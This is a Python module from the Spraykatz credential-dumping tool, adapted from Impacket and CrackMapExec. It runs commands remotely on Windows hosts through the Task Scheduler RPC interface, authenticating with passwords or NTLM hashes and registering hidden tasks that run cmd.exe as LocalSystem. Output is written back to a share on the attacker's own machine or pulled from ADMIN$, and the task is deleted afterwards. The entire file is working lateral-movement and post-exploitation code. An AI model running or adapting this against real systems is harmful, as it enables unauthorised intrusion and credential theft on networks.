# coding: utf-8
#
# This file comes from Impacket & CrackMapExec project
# Slightly modified for Spraykatz.


# Imports
import os, sys, logging, time
from core.Utils import *
from impacket.dcerpc.v5 import tsch, transport
from impacket.dcerpc.v5.dtypes import NULL


class TSCH_EXEC:
    def __init__(self, target, share_name, username, password, domain, hashes=None, port="80"):
        self.__target = target
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__share_name = share_name
        self.__lmhash = ''
        self.__nthash = ''
        self.__outputBuffer = ''
        self.__retOutput = False
        self.__port = port

        if hashes is not None:
            if hashes.find(':') != -1:
                self.__lmhash, self.__nthash = hashes.split(':')
            else:
                self.__nthash = hashes

        if self.__password is None:
            self.__password = ''

        stringbinding = r'ncacn_np:%s[\pipe\atsvc]' % self.__target
        self.__rpctransport = transport.DCERPCTransportFactory(stringbinding)

        if hasattr(self.__rpctransport, 'set_credentials'):
            self.__rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)

    def execute(self, command, output=False):
        self.__retOutput = output
        self.execute_handler(command)
        return self.__outputBuffer

    def output_callback(self, data):
        self.__outputBuffer = data

    def execute_handler(self, data):
        if self.__retOutput:
            try:
                self.doStuff(data, fileless=True)
            except:
                self.doStuff(data)
        else:
            self.doStuff(data)

    def gen_xml(self, command, tmpFileName, fileless=False):

        xml = """<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <CalendarTrigger>
      <StartBoundary>2015-07-15T20:35:13.2757294</StartBoundary>
      <Enabled>true</Enabled>
      <ScheduleByDay>
        <DaysInterval>1</DaysInterval>
      </ScheduleByDay>
    </CalendarTrigger>
  </Triggers>
  <Principals>
    <Principal id="LocalSystem">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="LocalSystem">
    <Exec>
      <Command>cmd.exe</Command>
"""
        if self.__retOutput:
            if fileless:
                local_ip = self.__rpctransport.get_socket().getsockname()[0]
                command = command.replace('&', '&amp;')
                argument_xml = "      <Arguments>/C {} &gt; \\\\{}@{}\\misc\\tmp\\{} 2&gt;&amp;1</Arguments>".format(command, local_ip, self.__port, tmpFileName)
            else:
                argument_xml = "      <Arguments>/C {} &gt; %windir%\\Temp\\{} 2&gt;&amp;1</Arguments>".format(command, tmpFileName)


        elif self.__retOutput is False:
            argument_xml = "      <Arguments>/C {}</Arguments>".format(command)

        logging.debug('Generated argument XML: ' + argument_xml)
        xml += argument_xml

        xml += """
    </Exec>
  </Actions>
</Task>
"""
        return xml

    def doStuff(self, command, fileless=False):

        dce = self.__rpctransport.get_dce_rpc()

        dce.set_credentials(*self.__rpctransport.get_credentials())
        dce.connect()
        dce.bind(tsch.MSRPC_UUID_TSCHS)
        tmpName = gen_random_string(8)
        tmpFileName = tmpName + '.tmp'

        xml = self.gen_xml(command, tmpFileName, fileless)

        taskCreated = False
        logging.debug('Creating task \\%s' % tmpName)
        tsch.hSchRpcRegisterTask(dce, '\\%s' % tmpName, xml, tsch.TASK_CREATE, NULL, tsch.TASK_LOGON_NONE)
        taskCreated = True

        logging.debug('Running task \\%s' % tmpName)
        tsch.hSchRpcRun(dce, '\\%s' % tmpName)

        done = False
        while not done:
            logging.debug('Calling SchRpcGetLastRunInfo for \\%s' % tmpName)
            resp = tsch.hSchRpcGetLastRunInfo(dce, '\\%s' % tmpName)
            if resp['pLastRuntime']['wYear'] != 0:
                done = True
            else:
                time.sleep(2)

        logging.debug('Deleting task \\%s' % tmpName)
        tsch.hSchRpcDelete(dce, '\\%s' % tmpName)
        taskCreated = False

        if taskCreated is True:
            tsch.hSchRpcDelete(dce, '\\%s' % tmpName)

        if self.__retOutput:
            if fileless:
                while True:
                    try:
                        with open(os.path.join(os.path.dirname(os.path.realpath(sys.argv[0])), 'misc', 'tmp', tmpFileName), 'r') as output:
                            out = output.read()
                            if "Dump count reached" in out:
                                self.output_callback(output.read())
                                break
                            else:
                                time.sleep(1)
                    except IOError:
                        time.sleep(2)
            else:
                peer = ':'.join(map(str, self.__rpctransport.get_socket().getpeername()))
                smbConnection = self.__rpctransport.get_smb_connection()
                while True:
                    try:
                        smbConnection.getFile('ADMIN$', 'Temp\\%s' % tmpFileName, self.output_callback)
                        break
                    except Exception as e:
                        if str(e).find('SHARING') > 0:
                            time.sleep(3)
                        elif str(e).find('STATUS_OBJECT_NAME_NOT_FOUND') >= 0:
                            time.sleep(3)
                        else:
                            raise
                smbConnection.deleteFile('ADMIN$', 'Temp\\%s' % tmpFileName)

        dce.disconnect()
